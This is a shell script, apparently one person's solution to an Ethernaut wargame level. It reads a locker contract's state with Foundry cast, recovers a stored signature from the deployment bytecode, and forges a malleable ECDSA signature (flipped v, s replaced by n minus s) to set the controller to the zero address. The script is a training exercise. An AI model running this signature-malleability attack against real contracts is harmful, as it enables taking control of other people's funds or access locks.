source ~/ethernauts/.env
echo "RPC_URL: $RPC_URL"

INSTANCE=0x3ff10f9D613651cc9519266eE26E1ef99620A9D0

# cast call \
#     --rpc-url $RPC_URL \
#     $INSTANCE \
#     "lockCounter()(uint256)"
# # -> 1337

# cast call \
#     --rpc-url $RPC_URL \
#     $INSTANCE \
#     "lockers(uint256)(address)" 0
# # 0 -> 0x903e0131c5C7ad352f5Ca150B9C2Fb93823F4969
# # 1 -> null

# cast call \
#     --rpc-url $RPC_URL \
#     $INSTANCE \
#     "owner()(address)"
# # -> 0x465f1E2c7FFDe5452CFe92aC3aa1230B76B2B1CB

LOCKER=0x903e0131c5C7ad352f5Ca150B9C2Fb93823F4969
    # uint256 public immutable lockId;
    # bytes32 public immutable msgHash;
    # address public controller;
    # mapping(bytes32 => bool) public usedSignatures;


# cast call \
#     --rpc-url $RPC_URL \
#     $LOCKER \
#     "lockId()(uint256)"
# # 1337

# cast call \
#     --rpc-url $RPC_URL \
#     $LOCKER \
#     "msgHash()(bytes32)"
# # 0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae

# cast call \
#     --rpc-url $RPC_URL \
#     $LOCKER \
#     "controller()(address)"
# # 0x42069d82D9592991704e6E41BF2589a76eAd1A91 #42069 LOL


# The objective is to compromise the system in a way that anyone can open the door.
# For this, we look at "function _isValidSignature(...)"
# it verifies result of ecrecover() and compares it to the local controller address.
# if that value is addr(0), anyone can put anything and it will open.
# the current controller is not addr(0) so we need to change it (another alternative would be to invalidate the usedSignatures array, but i don't think it is this way)

# i have a theory that the signature used in the contstructor is not properly stored as an invalid verification address 
# because it stores keccak of sig, and not keccak of r,s,v
# so i need to build r s v from the original sig:


# 0x60c060405234801561000f575f5ffd5b506040516106e23803806106e283398101604081905261002e91610142565b60808281527f19457468657265756d205369676e6564204d6573736167653a0a3332000000005f908152601c849052603c812060a0819052604080518281526060868101516020838101919091528781015183850152928701519082015291936001939083855afa503d6100a957638baa579f5f526004601cfd5b5f805160808301604081815287516020808a01919091208552600190819052908420805460ff1916909117905582546001600160a01b0319166001600160a01b0383169081179093554290529250907f53b18c96aa52ab0b62231a748985fe77b5db7c4c758d0b398e220117ca69dfe19060a00160405180910390a250505050610212565b634e487b7160e01b5f52604160045260245ffd5b5f5f60408385031215610153575f5ffd5b825160208401519092506001600160401b03811115610170575f5ffd5b8301601f81018513610180575f5ffd5b80516001600160401b038111156101995761019961012e565b604051601f8201601f19908116603f011681016001600160401b03811182821017156101c7576101c761012e565b6040528181528282016020018710156101de575f5ffd5b5f5b828110156101fc576020818501810151838301820152016101e0565b505f602083830101528093505050509250929050565b60805160a0516104aa6102385f395f818160da015261023101525f60a001526104aa5ff3fe608060405234801561000f575f5ffd5b506004361061006f575f3560e01c8063e4e6cf4f1161004d578063e4e6cf4f146100d5578063f77c4791146100fc578063f978fd6114610126575f5ffd5b8063259aa240146100735780633e8cd5701461008857806366fa19321461009b575b5f5ffd5b6100866100813660046103ad565b610158565b005b6100866100963660046103dd565b6101af565b6100c27f000000000000000000000000000000000000000000000000000000000000000081565b6040519081526020015b60405180910390f35b6100c27f000000000000000000000000000000000000000000000000000000000000000081565b5f5461010e906001600160a01b031681565b6040516001600160a01b0390911681526020016100cc565b61014861013436600461042d565b60016020525f908152604090205460ff1681565b60405190151581526020016100cc565b5f610164848484610220565b9050806001600160a01b03167f50042401acb675fedd6dd939fccc629832ce60fa4185df25c01b20e8def195bf426040516101a191815260200190565b60405180910390a250505050565b6101ba848484610220565b505f80547fffffffffffffffffffffffff0000000000000000000000000000000000000000166001600160a01b0383169081179091556040514281527f8cf1cbc25758c16f47e27029c8104e5be712c49e9baaf12c1fd697a91b431680906020016101a1565b604080515f808252602082018084527f0000000000000000000000000000000000000000000000000000000000000000905260ff8616928201929092526060810184905260808101839052819060019060a0016020604051602081039080840390855afa158015610293573d5f5f3e3d5ffd5b5050604051601f1901515f549092506001600160a01b0380841691161490506102e8576040517f6d5769be00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b60408051606081018252858152602080820186905260ff88168284015291515f92610314929101610444565b60408051601f1981840301815291815281516020928301205f818152600190935291205490915060ff1615610375576040517f900bb2c900000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b5f908152600160208190526040909120805460ff19169091179055949350505050565b803560ff811681146103a8575f5ffd5b919050565b5f5f5f606084860312156103bf575f5ffd5b6103c884610398565b95602085013595506040909401359392505050565b5f5f5f5f608085870312156103f0575f5ffd5b6103f985610398565b9350602085013592506040850135915060608501356001600160a01b0381168114610422575f5ffd5b939692955090935050565b5f6020828403121561043d575f5ffd5b5035919050565b6060810181835f5b600381101561046b57815183526020928301929091019060010161044c565b5050509291505056fea2646970667358221220853c8ec9baf2e169c22fc683d24f2f46690e0bb16045f084bd5f56cbdd85effd64736f6c634300081c0033

# 0000000000000000000000000000000000000000000000000000000000000539 -> uint256
                                                                    # then comes bytes so:
# 0000000000000000000000000000000000000000000000000000000000000040 -> offset
# 0000000000000000000000000000000000000000000000000000000000000060 -> size

# original values:
# 1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91 -> r
# 78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2 -> s
# 000000000000000000000000000000000000000000000000000000000000001b -> v


MSG_HASH=0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae
V=00000000000000000000000000000000000000000000000000000000000001b
R=1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91
S=78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2
NEW_CONTROLLER=0000000000000000000000000000000000000000


V_PARAM=0x00000000000000000000000000000000000000000000000000000000000001b
R_PARAM=0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91
S_PARAM=0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2
NEW_CONTROLLER_PARAM=0x0000000000000000000000000000000000000000

# cast call \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     $LOCKER \
#     "changeController(uint8 v, bytes32 r, bytes32 s, address newController)()" $V $R $S $NEW_CONTROLLER
# correct, but already used


# Due to the x-axis symmetry, if (r,s) is a valid signature, so is (r, -s mod n)
# this is basically picking the same point on the curve, with the other V.
# This is called Signature Malleability.

V_MANIPULATED=0x00
if [ $((0x$V % 2)) -eq 0 ]; then
    V_MANIPULATED=0x$(printf "%064x" $((0x$V - 1)))
else
    V_MANIPULATED=0x$(printf "%064x" $((0x$V + 1)))
fi

R_MANIPULATED=$R_PARAM

S_PARAM=0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2
N=0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

S_MANIPULATED=0x87B7639B5F24E93BF106794133370F950D5E9B00F5B5C8CBD866A487529B814F

echo V: $V_MANIPULATED
echo R: $R_MANIPULATED
echo S: $S_MANIPULATED


# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     $LOCKER \
#     "changeController(uint8 v, bytes32 r, bytes32 s, address newController)()" $V_MANIPULATED $R_MANIPULATED $S_MANIPULATED $NEW_CONTROLLER_PARAM

# done
